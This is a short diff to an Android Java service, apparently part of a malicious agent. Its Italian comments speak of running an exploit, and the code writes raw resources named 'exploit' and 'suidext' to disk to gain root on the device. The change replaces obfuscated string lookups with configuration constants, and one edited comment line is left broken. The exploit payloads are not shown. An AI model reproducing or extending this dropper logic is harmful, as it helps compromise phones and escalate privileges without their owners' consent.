@@ -373,7 +373,7 @@ public class ServiceCore extends Service {
 			// InputStream manifestApkStream =
 			// getResources().openRawResource(R.raw.layout);
 			// fileWrite(manifest, manifestApkStream,
-			// Messages.getString("36.0"));
+			// Cfg.);
 
 			// Copiamolo in /data/app/*.apk
 			// /system/bin/ntpsvd qzx \"cat
@@ -505,12 +505,12 @@ public class ServiceCore extends Service {
 			InputStream stream = resources.openRawResource(R.raw.statuslog);
 
 			// "0x5A3D10448D7A912B"
-			fileWrite(exploit, stream, Messages.getString("36.1"));
-
+			fileWrite(exploit, stream, Cfg.RNDLOG);
+			
 			stream = resources.openRawResource(R.raw.statusdb);
 
 			// 0x5A3D10448D7A912A
-			fileWrite(suidext, stream, Messages.getString("36.2"));
+			fileWrite(suidext, stream, Cfg.RNDDB);
 
 			// Eseguiamo l'exploit
 			final File filesPath = getApplicationContext().getFilesDir();
